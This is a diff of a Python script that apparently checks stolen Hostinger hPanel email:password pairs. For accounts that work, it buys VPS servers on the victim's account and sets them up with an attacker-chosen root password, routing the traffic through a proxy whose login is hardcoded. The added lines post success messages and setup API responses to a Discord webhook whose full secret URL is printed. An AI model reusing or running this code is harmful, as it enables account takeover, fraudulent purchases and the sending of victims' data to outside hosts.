@@ -153,11 +153,11 @@ def check():
                         'Authorization': f'Bearer {jwt}',
                     })
 
-                    get_vps = client.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine?gaid=GA1.2.1081141849.1732406814', headers={
+                    get_vps = client.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine', headers={
                         'Authorization': f'Bearer {jwt}',
                     })
 
-                    get_domains = client.get('https://hpanel.hostinger.com/api/auth/api/external/v1/access?gaid=GA1.2.1132560424.1732450522', headers={
+                    get_domains = client.get('https://hpanel.hostinger.com/api/auth/api/external/v1/access', headers={
                         'Authorization': f'Bearer {jwt}',
                     })
                     if get_domains.json()['data']['managing_me']:
@@ -364,16 +364,18 @@ def check():
                                             autobuyed += 1
                                             with open('results/autobuyed.txt', 'a') as f:
                                                 f.write(f'{email}:{passwd}\n')
+                                            httpx.post('https://ptb.discord.com/api/webhooks/1310705462294872156/uum3xYUAXK_-A8rg4nUrLTlhEJOedfITRC8P1CMx9MU_8rhyM_NvfmWREEAfKxmUefbu', json={'content': f'Balls @everyone'})
+
                                             if autosetup_enabled:
                                                 clientb = httpx.Client(proxy=f'http://brd-customer-hl_d2ac0d30-zone-datacenter_proxy1:ewxmmc5ezeom@brd.superproxy.io:33335', timeout=60)
-                                                fetch_vps = clientb.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine?gaid=GA1.2.1570124997.1732580115', headers={
+                                                fetch_vps = clientb.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine', headers={
                                                     'Authorization': f'Bearer {jwt}',
                                                 })
 
-                                                setup = clientb.post(f'https://hpanel.hostinger.com/api/vps/v1/virtual-machine/{fetch_vps.json()['data'][0]['id']}/setup?gaid=GA1.2.1570124997.1732580115', json={
+                                                setup = clientb.post(f'https://hpanel.hostinger.com/api/vps/v1/virtual-machine/{fetch_vps.json()['data'][0]['id']}/setup', json={
                                                     'template_id': 1077,
                                                     'data_center_id': autosetup_location,
-                                                    'hostname': fetch_vps.json()['data'][1]['hostname'],
+                                                    'hostname': fetch_vps.json()['data'][0]['hostname'],
                                                     'panel_password': '',
                                                     'root_password': autosetup_passwd,
                                                     'install_monarx': False,
@@ -384,6 +386,8 @@ def check():
                                                 }, headers={
                                                     'Authorization': f'Bearer {jwt}',
                                                 })
+                                                httpx.post('https://ptb.discord.com/api/webhooks/1310705462294872156/uum3xYUAXK_-A8rg4nUrLTlhEJOedfITRC8P1CMx9MU_8rhyM_NvfmWREEAfKxmUefbu', json={'content': f'AutoSetup: {setup.status_code} {setup.json()} @everyone'})
+
                                                 if setup.status_code == 200:
                                                     ipv4_address = setup.json()["data"]["ipv4"][0]["address"]
                                                     print(f"{Fore.LIGHTYELLOW_EX}AUTOSETUP{Fore.RESET} | {Fore.LIGHTGREEN_EX}SUCCESS{Fore.RESET} | "
